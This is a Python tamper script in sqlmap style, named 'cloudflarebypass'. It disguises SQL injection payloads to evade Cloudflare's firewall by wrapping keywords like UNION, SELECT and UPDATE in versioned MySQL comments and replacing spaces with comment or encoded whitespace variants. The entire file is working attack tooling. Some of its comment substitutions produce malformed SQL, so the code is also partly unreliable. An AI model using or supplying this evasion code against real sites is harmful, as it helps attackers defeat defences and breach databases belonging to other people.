#!/usr/bin/env python
# JeevSQL Tamper: cloudflarebypass - by Jeevraj
# Applies Cloudflare WAF-specific bypass techniques.
from lib.core.enums import PRIORITY
import re, random

__priority__ = PRIORITY.HIGH

CF_COMMENT_STYLES = ['/*!50000', '/*!40000', '/*! ', '/**_*/', '/*--*/']

def dependencies(): pass

def tamper(payload, **kwargs):
    if not payload:
        return payload
    # Cloudflare chokes on certain keyword sequences; insert versioned comments
    keywords = ['UNION', 'SELECT', 'WHERE', 'AND', 'OR', 'FROM', 'INSERT', 'UPDATE']
    result = payload
    for kw in keywords:
        if kw in result.upper():
            style = random.choice(CF_COMMENT_STYLES)
            replacement = '%s%s*/' % (style, kw)
            result = re.sub(r'\b%s\b' % kw, replacement, result, flags=re.IGNORECASE, count=1)
    # Replace spaces with CF-friendly variants
    result = re.sub(r' +', lambda m: random.choice(['/**/', '%09', '%0a', ' ']), result)
    return result
